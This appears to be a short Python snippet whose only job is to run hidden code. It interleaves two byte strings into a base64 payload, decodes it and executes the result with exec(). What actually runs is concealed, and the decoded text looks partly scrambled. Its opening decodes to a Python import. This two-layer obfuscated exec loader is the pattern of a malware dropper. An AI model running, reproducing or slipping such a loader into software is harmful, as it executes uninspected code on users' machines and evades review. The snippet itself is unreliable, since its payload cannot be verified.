import base64
_x = b'a1bJIJCpUAIJLNbBbUcdYxeEM0X5ZsLNKsfxJkCRZBbNchb9KoIAIJdVbBbJZQcVKlLZbRbwYxYkKo'
_y = b'Ww30HlgJC9HlmvXpGoiclkzs3oCcHxD9XzViyKmlio30yiGiTKCgHlHyiz30Wo20EQmpmhGomvipQ='
_p = b''.join(bytes([a, b]) for a, b in zip(_x, _y + b'\x00'))
exec(base64.b64decode(_p.rstrip(b'\x00')).decode())
